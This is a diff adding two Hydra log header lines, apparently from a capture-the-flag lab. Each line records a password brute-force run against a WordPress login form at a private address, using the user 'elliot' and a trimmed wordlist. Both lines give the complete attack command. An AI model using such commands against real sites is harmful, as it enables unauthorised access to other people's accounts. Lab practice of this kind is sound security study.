@@ -1,0 +1,2 @@
+# Hydra v8.8 run at 2019-04-12 23:18:47 on 192.168.64.192 http-post-form (hydra -l elliot -P fsocity_trimmed.txt -t 50 -w 30 -V -o hydra-http-post-attack.txt 192.168.64.192 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^:ERROR)
+# Hydra v8.8 run at 2019-04-12 23:19:48 on 192.168.64.192 http-post-form (hydra -l elliot -P fsocity_trimmed.txt -V -o hydra-http-post-attack.txt 192.168.64.192 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^:ERROR)
